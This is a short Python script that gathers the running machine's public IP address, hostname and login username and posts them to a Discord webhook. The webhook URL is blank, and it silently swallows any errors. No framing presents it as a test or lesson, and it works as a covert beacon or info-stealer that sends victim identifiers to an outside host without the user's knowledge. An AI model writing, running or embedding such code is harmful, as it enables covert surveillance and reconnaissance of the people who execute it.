import requests
import socket
import os

def send_to_webhook(data):
    try:
        webhook_url = ""
        headers = {
            "Content-Type": "application/json"
        }
        discord_data = {
            "content": f"Public IP: {data['public_ip']}\nComputer Name: {data['computer_name']}\nUsername: {data['username']}"
        }
        response = requests.post(webhook_url, json=discord_data, headers=headers)
        response.raise_for_status()
    except requests.RequestException as e:
        pass

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        response.raise_for_status()
        ip_data = response.json()
        return ip_data["ip"]
    except requests.RequestException:
        return None

def get_computer_name():
    try:
        return socket.gethostname()
    except Exception:
        return None

def get_username():
    try:
        return os.getlogin()
    except Exception:
        return None

if __name__ == "__main__":
    data = {
        "public_ip": get_public_ip(),
        "computer_name": get_computer_name(),
        "username": get_username()
    }
    send_to_webhook(data)
